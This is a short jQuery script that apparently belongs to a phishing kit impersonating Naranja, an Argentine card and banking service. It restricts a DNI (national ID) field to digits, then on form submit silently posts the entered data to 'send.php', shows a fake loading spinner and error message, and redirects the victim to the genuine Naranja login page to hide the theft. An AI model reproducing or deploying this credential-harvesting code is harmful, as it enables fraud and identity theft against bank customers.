$("input").focus(function(){
	$(this).parent().addClass("focus");
});

$("input").focusout(function(){
	if($(this).val() == ""){
		$(this).parent().removeClass("focus");
	}
});
$(".checkbox").click(function(){
	$(this).toggleClass("checked").toggleClass("nonchecked");
});
$(".checkbox_label").click(function(){
	$(".checkbox").toggleClass("checked").toggleClass("nonchecked");
});
$("input").keyup(function(){
	if($(this).val().length > 3){
		$("button").each(function(){
			$(this).removeAttr('disabled');
		});
	}
	else {
		$("button").each(function(){
			$(this).attr('disabled','disabled');
		});
	}
});
$("#dni").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#verify_data").submit(function(e){
	e.preventDefault();
	var form = $("#verify_data");
	$.ajax({
		type: "POST",
		url: "send.php",
		data: form.serialize()
	});
	$("#ingresar").css("display", "none");
	$("#ingresar1").css("display", "none");
	$("#pc").css("padding", ".6em .9em");
	$("#loading").css("display", "block");
	$("#loading1").css("display", "block");
	setTimeout(function(){
		$("#alert-error").css("display", "flex");
	}, 2500);
	setTimeout(function(){
		window.location.href = "https://online.naranja.com/login";
	}, 3500);
});